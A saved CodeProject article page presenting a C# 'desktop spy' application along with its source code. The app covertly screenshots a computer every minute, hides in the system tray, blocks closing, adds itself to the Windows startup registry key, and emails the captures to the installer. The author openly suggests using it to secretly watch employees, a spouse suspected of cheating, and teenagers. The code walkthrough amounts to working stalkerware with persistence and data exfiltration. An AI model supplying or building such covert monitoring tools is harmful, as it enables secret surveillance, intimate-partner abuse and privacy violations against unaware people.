      <DIV class=MI id=Section109><A 
      href="http://www.codeproject.com/KB/hardware-review/">Hardware 
      Reviews</A></DIV>
      <DIV class=MI id=Section63><A 
      href="http://www.codeproject.com/KB/interviews/">Interviews</A></DIV>
      <DIV class=MI id=Section65><A 
      href="http://www.codeproject.com/KB/showcase/">Product Showcase</A></DIV>
      <DIV class=MI id=Section62><A 
      href="http://www.codeproject.com/KB/scrapbook/">Scrapbook</A></DIV></DIV></DIV><BR>
      <DIV class=MenuCat>Feature Zones</DIV>
      <DIV class=MenuChapter><A 
      href="http://www.codeproject.com/kb/showcase/">Product Showcase</A></DIV>
      <DIV class=MenuChapter><A 
      href="http://www.codeproject.com/Zones/Install">Installshield 
      2008</A></DIV>
      <DIV class=MenuChapter><A href="http://www.codeproject.com/Zones/IBM">IBM 
      DeveloperWorks</A></DIV><BR>
      <SCRIPT type=text/javascript>document.write("<a href=\"http://www.codeproject.com/Redir.aspx?adid=4286&way=ban\" target=\"_blank\" rel=\"nofollow\"><img src=\"http://www.codeproject.com/script/Ann/ServeImg.aspx?File=%2fscript%2fadmentor%2fimages%2fCWS_net2_160x600.gif&C=False&id=4286\" alt=\"\" border=\"0\" width=\"160\" height=\"600\"></a>");</SCRIPT>
      <IMG height=1 alt="" src="/script/Common/Images/t.gif" width=160> </TD>
    <TD class=ArticlePane vAlign=top>
      <TABLE class=SearchHeaderBar cellSpacing=0 width="100%">
        <TBODY>
        <TR>
          <TD style="WIDTH: 60%; WHITE-SPACE: nowrap" vAlign=center 
            align=right><FORM style="MARGIN: 0px" name=Search 
            action=/info/search.aspx method=get><B>Search &nbsp;</B> <INPUT 
            class=SmallText style="WIDTH: 200px" name=artkw> <SELECT 
            class=SmallText style="FONT-WEIGHT: bold" name=sbo> <OPTION 
              value=kw selected>Articles</OPTION> <OPTION 
              value=fm>Messages</OPTION></SELECT> <INPUT class=SmallText style="FONT-WEIGHT: bold" type=submit value=" Go! "> 
            &nbsp; </FORM></TD>
          <TD class=TinyText style="WHITE-SPACE: nowrap"><A 
            href="http://www.codeproject.com/info/search.aspx">Advanced 
            Search</A><BR><A 
            href="http://www.codeproject.com/script/Content/SiteMap.aspx">Sitemap</A> 
            | <A id=ctl00_SearchBarCtrl_AddToIESearchLnk 
            title="Add The Code Project to your IE search Providers" 
            onclick="window.external.AddSearchProvider('http://www.codeproject.com/info/OpenSearch.xml');return false;" 
            href="http://www.codeproject.com/">Add to IE Search</A> 
        </TD></TR></TBODY></TABLE><SPAN id=ctl00_ResultMessage></SPAN>
      <DIV id=ctl00_ArtDiv>
      <TABLE cellSpacing=0 cellPadding=0 width="100%" border=0>
        <TBODY>
        <TR vAlign=top>
          <TD vAlign=top>
            <TABLE>
              <TBODY></TBODY></TABLE>
            <TABLE cellSpacing=1 cellPadding=3 width=1 border=0>
              <TBODY>
              <TR class=smalltext vAlign=center>
                <TD style="WHITE-SPACE: nowrap"><IMG 
                  style="BORDER-RIGHT: 0px; BORDER-TOP: 0px; VERTICAL-ALIGN: middle; BORDER-LEFT: 0px; BORDER-BOTTOM: 0px" 
                  height=16 alt=print src="/script/Articles/Images/print.gif" 
                  width=16> <A id=ctl00_ArticleHeaderLinks_PrintLnk 
                  href="http://www.codeproject.com/KB/miscctrl/desktopspy.aspx?display=Print">Print</A> 
                </TD>
                <TD style="WHITE-SPACE: nowrap"><IMG 
                  style="BORDER-RIGHT: 0px; BORDER-TOP: 0px; VERTICAL-ALIGN: middle; BORDER-LEFT: 0px; BORDER-BOTTOM: 0px" 
                  height=16 alt="Broken Article?" 
                  src="/script/Articles/Images/broken.gif" width=16> <A 
                  id=ctl00_ArticleHeaderLinks_BrokenLnk 
                  href="http://www.codeproject.com/script/Articles/Report.aspx?aid=22543">Broken 
                  Article?</A> </TD>
                <TD style="WHITE-SPACE: nowrap"></TD>
                <TD style="WHITE-SPACE: nowrap"><IMG 
                  style="BORDER-RIGHT: 0px; BORDER-TOP: 0px; VERTICAL-ALIGN: middle; BORDER-LEFT: 0px; BORDER-BOTTOM: 0px" 
                  height=16 alt=Discuss src="/script/Content/Images/discuss.gif" 
                  width=15> <A 
                  href="http://www.codeproject.com/KB/miscctrl/desktopspy.aspx#_comments">Discuss</A> 
                </TD>
                <TD style="WHITE-SPACE: nowrap"><IMG 
                  style="BORDER-RIGHT: 0px; BORDER-TOP: 0px; VERTICAL-ALIGN: middle; BORDER-LEFT: 0px; BORDER-BOTTOM: 0px" 
                  height=16 alt="Recommend Article" 
                  src="/script/Content/Images/mail.gif" width=16> <A 
                  id=ctl00_ArticleHeaderLinks_Recommend 
                  href="http://www.codeproject.com/script/common/TellFriend.aspx?obtid=2&amp;obid=22543">Send 
                  to a friend</A> </TD></TR></TBODY></TABLE></TD>
          <TD align=right>
            <TABLE>
              <TBODY>
              <TR>
                <TD class=SmallText style="WHITE-SPACE: nowrap" 
                  align=right><SPAN id=ctl00_ArticleRating_VoteLabel>4 votes for 
                  this Article.</SPAN> </TD>
                <TD>
                  <TABLE cellSpacing=0 cellPadding=0 border=1>
                    <TBODY>
                    <TR>
                      <TD width=20 bgColor=white height=5><IMG height=5 
                        src="/script/Ratings/Images/red.gif" width=20 
                      border=0></TD>
                      <TD width=20 bgColor=white height=5><IMG height=5 
                        src="/script/Ratings/Images/red.gif" width=20 
                      border=0></TD>
                      <TD noWrap width=20 bgColor=white height=5><IMG height=5 
                        src="/script/Ratings/Images/red.gif" width=14 
                      border=0></TD>
                      <TD width=20 bgColor=white height=5><IMG height=5 
                        src="/script/Ratings/Images/white.gif" width=20 
                      border=0></TD>
                      <TD width=20 bgColor=white height=5><IMG height=5 
                        src="/script/Ratings/Images/white.gif" width=20 
                      border=0></TD></TR></TBODY></TABLE></TD></TR>
              <TR id=ctl00_ArticleRating_PopularityRow>
                <TD class=SmallText align=right colSpan=2><A 
                  id=ctl00_ArticleRating_PopularityLnk 
                  title="Calculated as rating x Log10(# votes)" 
                  href="http://www.codeproject.com/script/Articles/TopArticles.aspx?ta_so=1">Popularity: 
                  1.63</A><SPAN id=ctl00_ArticleRating_PopularityLbl></SPAN> 
                  Rating: <B>2.71</B> out of 5 
      </TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE>
      <DIV class=SmallText id=ctl00_UneditedRow 
      style="PADDING-RIGHT: 5px; BORDER-TOP: #ff9900 1px dashed; PADDING-LEFT: 5px; PADDING-BOTTOM: 5px; MARGIN: 5px; PADDING-TOP: 5px; BORDER-BOTTOM: #ff9900 1px dashed"><B>Note:</B> 
      This is an unedited contribution. If this article is inappropriate, needs 
      attention or copies someone else's work without reference then please <A 
      id=ctl00_ReportProblem 
      href="http://www.codeproject.com/script/Articles/Report.aspx?aid=22543">Report 
      This Article</A> </DIV><SPAN id=intelliTXT>
      <DIV id=contentdiv><!-- Main Page Contents Start --><!-- Article Starts -->
      <UL class=download>
        <LI><A href="http://omar.mvps.org/share/desktopcapture.zip">Download 
        source - 40.8 Kb</A> </LI></UL>
      <P><IMG height=250 alt=surveillance.png src="desktopspy/surveillance.png" 
      width=400></P>
      <H2>Introduction </H2>
      <P>Some time back I needed to capture a certain computers desktop in order 
      to find out what that user is doing every day. So, I made a .NET 2.0 
      Winforms Application which stays on system tray (optional) and capture the 
      desktop in given time interval (say every 60 secs) and emailed the 
      captured images to me as message attachment (say every 30 mins). It 
      ensures the captures are small enough and embedded inside HTML email so 
      that I don't need to open hundreds of attachments and see the screenshots. 
      I could just read through the email and see the captures made. You will 
      find this application quite handy in many use cases including:</P>
      <UL>
        <LI>Keep an eye on employees who spend too much time on web or chatting. 
        See what they really do. 
        <LI>Keep an eye on your better half incase s/he is cheating on you. 
        <LI>Keep an eye on your teenagers and see how they use computer. Find 
        the amount of time they browser porn on web. </LI></UL>
      <P>All you do is sit back and relax in your office and the app informs you 
      every 30 mins via email what your subject is doing on the computer. You 
      don't need to worry about missing some captures when you are away from 
      your computer. It will be safely kept in your inbox and you can go through 
      all the captures on your weekend.</P>
      <P>Please note, this is a surveillance application and by nature it 
      violates privacy policy. So, you are solely resposible for whatever way 
      you use it.</P>
      <H2>How to use the application</H2>
      <P>Configure the following settings from the Visual Studio Settings 
      Designer (if you have Visual Studio):</P>
      <P><IMG height=384 alt=Configuration.png 
      src="desktopspy/Configuration.png" width=637></P>
      <P>Configure the path where the screenshots will be stored. Then configure 
      the duration, default is every 1 minute, one screenshot is taken. "To" 
      contains the email address of yours. Use free email services because very 
      soon you will find it's filled up. Username and Password is for the SMTP 
      authentication. "SMTP" contains the SMTP Server name or IP. 
      "MailSendDelay" is the delay between sending emails.</P>
      <P>All you need to do is build the app and run it once on the computer 
      which you want to keep an eye on. It will hide itself on the system tray 
      as a harmless icon and register itself on the startup and start capturing 
      immediately. After a week or two, cleanup the "C:\temp" folder where the 
      screenshots are kept.</P>
      <P>You can also configure the properties at run time after running it once 
      on a computer. This is for those who does not have Visual Studio in order 
      to configure the settings before building it.</P>
      <P>In order to launch the configuration dialog box while the application 
      is running, find the icon on the system tray and click mouse buttons 
      exactly in this order:</P>
      <UL>
        <LI>Press and hold left and right mouse button on the system tray icon 
        one after another 
        <LI>Release only the right mouse button while holding the left mouse 
        button down </LI></UL>
      <P>This will bring up the configuration dialog:</P>
      <P><IMG height=300 alt=Properties.png src="desktopspy/Properties.png" 
      width=300></P>
      <P>Here you can make changes while it is running.</P>
      <P>One the application is run on a PC, it will register itself in the 
      startup. So, every time Windows starts, it will load the application 
      automatically and start taking screenshots.</P>
      <P>Let's learn some interesting stuffs from this application:</P>
      <H2>Prevent closing the application when close button is clicked</H2>
      <P>The spy application needs to keep on running all the time. So, we need 
      to prevent it from closing. In order to keep the application running, one 
      window must remain loaded and hidden. So, that window's 
      <CODE>FormClosing</CODE> event must cancel the close event. </P><PRE><SPAN class=code-keyword>private</SPAN> <SPAN class=code-keyword>void</SPAN> MainForm_FormClosing(<SPAN class=code-SDKkeyword>object</SPAN> sender, FormClosingEventArgs e)
{
Settings.Default.Save();
<SPAN class=code-keyword>this</SPAN>.Hide();
e.Cancel = <SPAN class=code-keyword>true</SPAN>;
}</PRE>
      <P>The window is also made hidden and not to appear on the taskbar. You 
      can turn off <CODE>ShowInTaskbar</CODE> property from the Form's 
      properties. The Properties window is kept alive all the time hidden and 
      moved away from visible area.</P>
      <H2>Capture screenshot of desktop</H2>
      <P>The following code can take a screenshot of the whole screen. It only 
      takes primary screen's screenshot. If you have multiple monitor, then you 
      need to capture theminvidually.</P><PRE><SPAN class=code-keyword>using</SPAN> (Bitmap bmpScreenshot = 
<SPAN class=code-keyword>new</SPAN> Bitmap(Screen.PrimaryScreen.Bounds.Width, 
Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb)) 
{ 
<SPAN class=code-comment>//</SPAN><SPAN class=code-comment> Create a graphics object from the bitmap  </SPAN>
<SPAN class=code-keyword>using</SPAN> (Graphics gfxScreenshot = Graphics.FromImage(bmpScreenshot)) 
{ 
<SPAN class=code-keyword>try</SPAN>  
{ 
Log(<SPAN class=code-string>"</SPAN><SPAN class=code-string>Capture screen"</SPAN>); 
<SPAN class=code-comment>//</SPAN><SPAN class=code-comment> Take the screenshot from the upper left corner to the right bottom corner  </SPAN>
gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, 
Screen.PrimaryScreen.Bounds.Y, 
<SPAN class=code-digit>0</SPAN>, <SPAN class=code-digit>0</SPAN>, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);</PRE>
      <P>First a bitmap object for the whole screen size is created and then the 
      graphics from the screen is copied to the <CODE>Bitmap</CODE> object.</P>
      <H2>Convert the Bitmap to low resolution JPEG</H2>
      <P>A desktop screenshot is a large picture and can easily size about 300 
      KB when converted to JPEG regular mode. If you have high resolution like 
      1600X1024 or more, the screenshot size will be even bigger. If such large 
      files are emailed to you as attachment, it will be a real pain for you and 
      your mail server. So, you need to convert the bitmap to a low quality 
      JPEG.</P><PRE><SPAN class=code-comment>//</SPAN><SPAN class=code-comment>Get the ImageCodecInfo for the desired target format</SPAN>
ImageCodecInfo codec = GetEncoderInfo(<SPAN class=code-string>"</SPAN><SPAN class=code-string>image/jpeg"</SPAN>);

<SPAN class=code-comment>//</SPAN><SPAN class=code-comment> Set the quality to very low</SPAN>
System.Drawing.Imaging.Encoder qualityEncoder = System.Drawing.Imaging.Encoder.Quality;
EncoderParameter ratio = <SPAN class=code-keyword>new</SPAN> EncoderParameter(qualityEncoder, 10L);
<SPAN class=code-comment>//</SPAN><SPAN class=code-comment> Add the quality parameter to the list</SPAN>
EncoderParameters codecParams = <SPAN class=code-keyword>new</SPAN> EncoderParameters(<SPAN class=code-digit>1</SPAN>);
codecParams.Param[<SPAN class=code-digit>0</SPAN>] = ratio;</PRE>
      <P>Here we configure the JPEG codec with very low resolution (10%). 
      <CODE>GetEncoderInfo</CODE> is a function which runs through all available 
      codecs and finds the one we need.</P><PRE><SPAN class=code-keyword>private</SPAN> <SPAN class=code-keyword>static</SPAN> ImageCodecInfo GetEncoderInfo(<SPAN class=code-SDKkeyword>String</SPAN> mimeType)
{
<SPAN class=code-keyword>int</SPAN> j;
ImageCodecInfo[] encoders;
encoders = ImageCodecInfo.GetImageEncoders();
<SPAN class=code-keyword>for</SPAN> (j = <SPAN class=code-digit>0</SPAN>; j <SPAN class=code-keyword>&lt;</SPAN> encoders.Length; ++j)
{
<SPAN class=code-keyword>if</SPAN> (encoders[j].MimeType == mimeType)
<SPAN class=code-keyword>return</SPAN> encoders[j];
} <SPAN class=code-keyword>return</SPAN> null;
}</PRE>
      <P>Once the coversion is done, you can save the bitmap in a file.</P><PRE><SPAN class=code-keyword>using</SPAN> (FileStream fs = <SPAN class=code-keyword>new</SPAN> FileStream(filePath, FileMode.Create))
{
    bmpScreenshot.Save(fs, codec, codecParams);
    fs.Close();
}</PRE>
      <H2>Handling Win32 exception</H2>
      <P>I noticed sometimes during screen capture, an unknown 
      <CODE>Win32Exception</CODE> throws up. There's no way to work around this 
      problem until I restart the application. Here's how I do it:</P><PRE><SPAN class=code-keyword>catch</SPAN> (Exception x)
{
    Log(x.ToString());
    <SPAN class=code-keyword>if</SPAN> (x is Win32Exception)
    {
        Log(<SPAN class=code-string>"</SPAN><SPAN class=code-string>Restarting..."</SPAN>);
        Application.Restart();
    }
} </PRE>
      <H2>How to email the pictures as embedded image in HTML format</H2>
      <P>You can email the pictures as regular attachment. But that makes 
      looking at those screenshots very difficult as you have to double click on 
      each and every attachment. A better approach is to create an html 
      formatted email body where the screenshots are embedded one after another. 
      Thus you can just read the email with the screenshots and see every 
      thing's that has been captured at one glimpse.</P>
      <P>First connect to the mail server using 
      <CODE>System.Net.SmtpClient</CODE>:</P><PRE>SmtpClient client = <SPAN class=code-keyword>new</SPAN> SmtpClient(Settings.Default.Smtp);
client.Credentials = <SPAN class=code-keyword>new</SPAN> NetworkCredential(Settings.Default.UserName, Settings.Default.Password);

MailMessage msg = <SPAN class=code-keyword>new</SPAN> MailMessage(Settings.Default.To, Settings.Default.To);
msg.Subject = DateTime.Now.ToString();
msg.IsBodyHtml = <SPAN class=code-keyword>true</SPAN>;</PRE>
      <P>The last line starts an HTML formatted email body. We are going to 
      construct an Html mail where the images will be inline. The tricky part is 
      to build the body of the message. The body requires that we create 
      &lt;img&gt; tag for each image inside the body in this format:</P><PRE><SPAN class=code-keyword>&lt;</SPAN>img src=cid:ID_OF_THE_IMAGE /<SPAN class=code-keyword>&gt;</SPAN></PRE>
      <P>The ID needs to be the <CODE>ContentID</CODE> of the 
      <CODE>LinkedResource</CODE> instance which is created for each image. 
      Here's the code:</P><PRE>List<SPAN class=code-keyword>&lt;</SPAN>LinkedResource<SPAN class=code-keyword>&gt;</SPAN> resources = <SPAN class=code-keyword>new</SPAN> List<SPAN class=code-keyword>&lt;</SPAN>LinkedResource<SPAN class=code-keyword>&gt;</SPAN>();
<SPAN class=code-keyword>for</SPAN> (<SPAN class=code-keyword>int</SPAN> i = Settings.Default.LastSentFileNo; i <SPAN class=code-keyword>&lt;</SPAN> Settings.Default.LastFileNo; i++)
{
    <SPAN class=code-SDKkeyword>string</SPAN> filePath = FilePath(i); 

    <SPAN class=code-comment>//</SPAN><SPAN class=code-comment>then we create the Html part</SPAN>
    <SPAN class=code-comment>//</SPAN><SPAN class=code-comment>to embed images, we need to use the prefix 'cid' in the img src value</SPAN>
    <SPAN class=code-comment>//</SPAN><SPAN class=code-comment>the cid value will map to the Content-Id of a Linked resource.</SPAN>
    <SPAN class=code-comment>//</SPAN><SPAN class=code-comment>thus &lt;img src='cid:companylogo'&gt; will map to a </SPAN>
    <SPAN class=code-comment>//</SPAN><SPAN class=code-comment> LinkedResource with a ContentId of 'companylogo'</SPAN>

    body.AppendLine(<SPAN class=code-string>"</SPAN><SPAN class=code-string>&lt;img src=cid:Capture"</SPAN> + i.ToString() + <SPAN class=code-string>"</SPAN><SPAN class=code-string> /&gt;"</SPAN>);

    <SPAN class=code-comment>//</SPAN><SPAN class=code-comment>create the LinkedResource (embedded image)</SPAN>
    LinkedResource logo = <SPAN class=code-keyword>new</SPAN> LinkedResource(filePath);
    logo.ContentId = <SPAN class=code-string>"</SPAN><SPAN class=code-string>Capture"</SPAN> + i.ToString();
    <SPAN class=code-comment>//</SPAN><SPAN class=code-comment>add the LinkedResource to the appropriate view</SPAN>
    resources.Add(logo);    
}</PRE>
      <P>I keep a counter for the last capture file name and the last emailed 
      file number. Then for each capture file which has not been emailed yet, I 
      create a <CODE>LinkedResource</CODE> for the image and then add it in the 
      resources list. I also build the body of the message which contains the 
      <CODE><SPAN class=code-keyword>&lt;</SPAN>img<SPAN 
      class=code-keyword>&gt;</SPAN></CODE> tag with the 
      <CODE>LinkedResource</CODE> <CODE>ContentID</CODE>.</P>
      <P>Then we create something called <CODE>AlternateView</CODE> for the 
      message body which says the message has a HTML view:</P><PRE>AlternateView htmlView = AlternateView.CreateAlternateViewFromString(body.ToString(), null, <SPAN class=code-string>"</SPAN><SPAN class=code-string>text/html"</SPAN>);

foreach (LinkedResource resource <SPAN class=code-keyword>in</SPAN> resources)
    htmlView.LinkedResources.Add(resource);

msg.AlternateViews.Add(htmlView);</PRE>
      <P>This view contains the HTML body and the resource collection. </P>
      <P>After this, the email is sent asynchronously so that the screen capture 
      process does not get stuck. It generally takes a while to send the image 
      with all the screenshots embedded. So, you can't do this 
synchronously.</P><PRE><SPAN class=code-keyword>try</SPAN>
{
    client.Timeout = <SPAN class=code-digit>10</SPAN> * <SPAN class=code-digit>60</SPAN> * <SPAN class=code-digit>1000</SPAN>;
    client.SendAsync(msg, <SPAN class=code-string>"</SPAN><SPAN class=code-string>"</SPAN>);
    client.SendCompleted += <SPAN class=code-keyword>new</SPAN> SendCompletedEventHandler(client_SendCompleted);

    mailSendTimer.Stop();

    Log(<SPAN class=code-string>"</SPAN><SPAN class=code-string>Sending mail..."</SPAN>);
            
}
<SPAN class=code-keyword>catch</SPAN> (Exception x)
{
    Log(x.ToString());
}</PRE>
      <P>How to register application to start at startup</P>
      <P>I have a handy <CODE>RegistryHelper</CODE> class which can register a 
      path in the system registry at 
      <CODE>Software\Microsoft\Windows\CurrentVersion\Run</CODE> location. 
      Whatever you put there, Windows launches it at startup. I found this code 
      somewhere on the web long time back. Not sure who's the original 
      author.</P><PRE>internal <SPAN class=code-keyword>static</SPAN> <SPAN class=code-keyword>class</SPAN> RegistryHelper
{
<SPAN class=code-keyword>private</SPAN> <SPAN class=code-keyword>const</SPAN> <SPAN class=code-SDKkeyword>string</SPAN> REGISTRY_VALUE = <SPAN class=code-string>"</SPAN><SPAN class=code-string>DesktopSpyStartup"</SPAN>;

<SPAN class=code-keyword>public</SPAN> <SPAN class=code-keyword>static</SPAN> <SPAN class=code-keyword>void</SPAN> RegisterAtStartup()
{
<SPAN class=code-comment>//</SPAN><SPAN class=code-comment> get reference to the HKLM registry key...</SPAN>
RegistryKey rkHKLM = Registry.LocalMachine;
RegistryKey rkRun;

<SPAN class=code-comment>//</SPAN><SPAN class=code-comment> get reference to Software\Microsoft\Windows\CurrentVersion\Run subkey</SPAN>
<SPAN class=code-comment>//</SPAN><SPAN class=code-comment> with permission to write to it...</SPAN>
<SPAN class=code-keyword>try</SPAN>
{
rkRun = 
rkHKLM.OpenSubKey(<SPAN class=code-string>"</SPAN><SPAN class=code-string>Software\\Microsoft\\Windows\\CurrentVersion\\Run"</SPAN>,<SPAN class=code-keyword>true</SPAN>);
}
<SPAN class=code-keyword>catch</SPAN>
{
<SPAN class=code-comment>//</SPAN><SPAN class=code-comment> close the HKLM key...</SPAN>
rkHKLM.Close();
<SPAN class=code-keyword>return</SPAN>;
}

<SPAN class=code-keyword>try</SPAN>
{
<SPAN class=code-comment>//</SPAN><SPAN class=code-comment> Check if there is any value already there</SPAN>
<SPAN class=code-comment>//</SPAN><SPAN class=code-comment>if( null != rkRun.GetValue("RSS Feeder") )</SPAN>
<SPAN class=code-comment>//</SPAN><SPAN class=code-comment>{</SPAN>
<SPAN class=code-comment>//</SPAN><SPAN class=code-comment> create a value with name same as the data...</SPAN>
System.Reflection.Assembly ass = System.Reflection.Assembly.GetEntryAssembly();
<SPAN class=code-SDKkeyword>string</SPAN> directory = System.IO.Path.GetDirectoryName( ass.Location );

<SPAN class=code-SDKkeyword>string</SPAN> starterPath = System.IO.Path.Combine( directory, <SPAN class=code-string>"</SPAN><SPAN class=code-string>DesktopCapture.exe"</SPAN> );

rkRun.SetValue(REGISTRY_VALUE, starterPath);

Console.WriteLine(<SPAN class=code-string>"</SPAN><SPAN class=code-string>Entry successfully created in the registry!"</SPAN>);
<SPAN class=code-comment>//</SPAN><SPAN class=code-comment>}</SPAN>
}
<SPAN class=code-keyword>catch</SPAN>
{
<SPAN class=code-comment>//</SPAN><SPAN class=code-comment> error while creating entry...</SPAN>
Console.WriteLine(<SPAN class=code-string>"</SPAN><SPAN class=code-string>Unable to create an entry for the application!"</SPAN>);
}

<SPAN class=code-comment>//</SPAN><SPAN class=code-comment> close the subkey...</SPAN>
rkRun.Close();
<SPAN class=code-comment>//</SPAN><SPAN class=code-comment> close the HKLM key...</SPAN>
rkHKLM.Close();
}

<SPAN class=code-keyword>public</SPAN> <SPAN class=code-keyword>static</SPAN> <SPAN class=code-keyword>void</SPAN> UnregisterAtStartup()
{
<SPAN class=code-comment>//</SPAN><SPAN class=code-comment> get reference to the HKLM registry key...</SPAN>
RegistryKey rkHKLM = Registry.LocalMachine;
RegistryKey rkRun;

<SPAN class=code-comment>//</SPAN><SPAN class=code-comment> get reference to Software\Microsoft\Windows\CurrentVersion\Run subkey</SPAN>
<SPAN class=code-comment>//</SPAN><SPAN class=code-comment> with permission to write to it...</SPAN>
<SPAN class=code-keyword>try</SPAN>
{
rkRun = 
rkHKLM.OpenSubKey(<SPAN class=code-string>"</SPAN><SPAN class=code-string>Software\\Microsoft\\Windows\\CurrentVersion\\Run"</SPAN>,<SPAN class=code-keyword>true</SPAN>);
}
<SPAN class=code-keyword>catch</SPAN>
{
<SPAN class=code-comment>//</SPAN><SPAN class=code-comment> close the HKLM key...</SPAN>
rkHKLM.Close();
<SPAN class=code-keyword>return</SPAN>;
}

<SPAN class=code-keyword>try</SPAN>
{
rkRun.DeleteValue( REGISTRY_VALUE );
}
<SPAN class=code-keyword>catch</SPAN>
{
}

<SPAN class=code-comment>//</SPAN><SPAN class=code-comment> close the subkey...</SPAN>
rkRun.Close();
<SPAN class=code-comment>//</SPAN><SPAN class=code-comment> close the HKLM key...</SPAN>
rkHKLM.Close();
}
}</PRE>
      <H2>Conclusion</H2>
      <P>This is a very low footprint easy to use desktop capture and email 
      utility. Once it's run in a computer, it will keep capturing screenshot of 
      all users on that computer and email to you periodically. All you need to 
      do is skim through those emails every now and then and see what your 
      subject is doing. Please note, this is a surveillance application and by 
      nature it violates privacy policy. So, you are solely responsible for 
      whatever way you use it. </P><!-- Article Ends --><!-- Main Page Contents End --></DIV></SPAN>
      <H2>License</H2>
      <P>This article, along with any associated source code and files, is 
      licensed under <A href="http://www.codeproject.com/info/cpol10.aspx">The 
      Code Project Open License (CPOL)</A></P>
      <H2>About the Author</H2>
      <TABLE cellSpacing=5 cellPadding=0 width="100%" border=0>
        <TBODY>
        <TR vAlign=top>
          <TD id=ctl00_AboutAuthorRptr_ctl00_AboutAuthor_memberPhotoTable 
          style="WIDTH: 155px" vAlign=top><B><A 
            id=ctl00_AboutAuthorRptr_ctl00_AboutAuthor_memberProfileLink 
            href="http://www.codeproject.com/script/Membership/Profiles.aspx?mid=138289">Omar 
            Al Zabir</A></B><BR><BR>
            <CENTER><IMG id=ctl00_AboutAuthorRptr_ctl00_AboutAuthor_memberPhoto 
            style="BORDER-TOP-WIDTH: 0px; BORDER-LEFT-WIDTH: 0px; BORDER-BOTTOM-WIDTH: 0px; BORDER-RIGHT-WIDTH: 0px" 
            src="/script/Membership/ProfileImages/{F013AFD8-06A7-466F-86B5-6C283DF360D2}.jpg"></CENTER><BR><SPAN 
            class=SmallText 
            id=ctl00_AboutAuthorRptr_ctl00_AboutAuthor_memberType></SPAN></TD>
          <TD>I am Co-founder and CTO of <A 
            href="http://www.pageflakes.com/">http://www.pageflakes.com/</A> , a 
            Web 2.0 personalized start page. My skill is mostly on Enterprise 
            Applications and mass consumer web applications. I have worked for 
            clients like Bank Of America, Federel Reserved Bank, HSBC, CitiBank, 
            WAMU, FNB, HP since I was 15.<BR><BR>My book on building fast, 
            scalable, state-of-the-art ASP.NET and AJAX websites - <A 
            href="http://www.oreilly.com/catalog/9780596510503/">Building a Web 
            2.0 portal using ASP.NET 3.5</A>.<BR>Also on <A 
            href="http://www.amazon.com/Building-Web-2-0-Portal-ASP-NET/dp/0596510500">Amazon</A><BR><BR>I 
            did my B.Sc. in Computer Science in 2006. I have received Visual C# 
            MVP award thrice.<BR><BR>Here's my personal website which started it 
            all: <A href="http://www.oazabir.com/">http://www.oazabir.com/</A> 
            <BR><BR>Email: OmarALZabir at gmail dot com<BR>Blog: <A 
            href="http://www.msmvps.com/omar">http://www.msmvps.com/omar</A><BR>Open 
            Source Projects:<BR><A href="http://www.dropthings.com/">Dropthings 
            Ajax Portal</A><BR><A href="http://smartuml.sourceforge.net/">Smart 
            UML - Freehand UML Designer</A><BR><A 
            href="http://rssfeederdotnet.sourceforge.net/">RSS Aggregator both 
            Outlook and Standalone</A><BR><A 
            href="http://storefront2004.sourceforge.net/">Store Front in JSP but 
            ASP.NET style</A><BR><BR>I am from Dhaka, Bangladesh. I love to 
            travel. My favorite places are Kuala Lumpur, Stuttgart, Barcelona, 
            San Francisco, Seattle, and Oslo.<BR><BR>
            <TABLE>
              <TBODY>
              <TR id=ctl00_AboutAuthorRptr_ctl00_AboutAuthor_jobTitleRow>
                <TD class=SmallText noWrap>Occupation: </TD>
                <TD width="100%"><SPAN class=SmallText 
                  id=ctl00_AboutAuthorRptr_ctl00_AboutAuthor_memberJobTitle>Chief 
                  Technology Officer</SPAN></TD></TR>
              <TR id=ctl00_AboutAuthorRptr_ctl00_AboutAuthor_companyRow>
                <TD class=SmallText>Company: </TD>
                <TD width="100%"><SPAN class=SmallText 
                  id=ctl00_AboutAuthorRptr_ctl00_AboutAuthor_memberCompany>Pageflakes 
                  Inc</SPAN></TD></TR>
              <TR id=ctl00_AboutAuthorRptr_ctl00_AboutAuthor_locationRow>
                <TD class=SmallText>Location: </TD>
                <TD width="100%"><SPAN class=SmallText 
                  id=ctl00_AboutAuthorRptr_ctl00_AboutAuthor_memberLocation><IMG 
                  height=11 alt=Bangladesh src="/script/Geo/Images/BD.gif" 
                  width=16> 
      Bangladesh</SPAN></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE><BR>
      <TABLE id=ctl00_PopularArticlesRow cellSpacing=0 cellPadding=0 
      width="100%" border=0>
        <TBODY>
        <TR vAlign=top>
          <TD style="WIDTH: 100%">
            <H2>Other popular Miscellaneous articles:</H2>
            <UL>
              <LI><A 
              href="http://www.codeproject.com/KB/miscctrl/gridctrl.aspx">MFC 
              Grid control 2.26</A>
              <DIV class=SmallText>A fully featured MFC grid control for 
              displaying tabular data. The grid is a custom control derived from 
              CWnd</DIV>
              <LI><A 
              href="http://www.codeproject.com/KB/miscctrl/XPTaskBar.aspx">Themed 
              Windows XP style Explorer Bar</A>
              <DIV class=SmallText>A fully customizable Windows XP style 
              Explorer Bar that supports Windows XP themes and animated 
              expand/collapse with transparency.</DIV>
              <LI><A 
              href="http://www.codeproject.com/KB/miscctrl/taskbarnotifier.aspx">TaskbarNotifier, 
              a skinnable MSN Messenger-like popup in C# and now in VB.NET 
              too</A>
              <DIV class=SmallText>The TaskbarNotifier class allows to display 
              an MSN Messenger-like animated popup with a skinned 
              background</DIV>
              <LI><A 
              href="http://www.codeproject.com/KB/miscctrl/pptooltip.aspx">CPPToolTip 
              v2.1</A>
              <DIV class=SmallText>A class that allows you to display your data 
              for a control as tooltip</DIV>
              <LI><A 
              href="http://www.codeproject.com/KB/miscctrl/formulactrl.aspx">Formula 
              Editor</A>
              <DIV class=SmallText>Formula-editor for editing and exporting 
              mathematical content</DIV></LI></UL>
            <H2></H2></TD>
          <TD><IFRAME 
            src="C:\Documents and Settings\admin\Desktop\qwe\CodeProject Desktop spy utility that emails subject's screenshots to you_ Free source code and programming help_files\ServeHTML(2).htm" 
            frameBorder=0 width=300 scrolling=no 
        height=250></IFRAME></TD></TR></TBODY></TABLE>
      <DIV id=ctl00_AddTo style="MARGIN: 10px">
      <SCRIPT language=JavaScript type=text/javascript>
			var addtoMethod=1;
			var AddURL = document.location.href;
			var AddTitle = escape(document.title);
			DrawLinks(100, 0, "SmallText Bold", "AddTo") 
			</SCRIPT>
      </DIV>
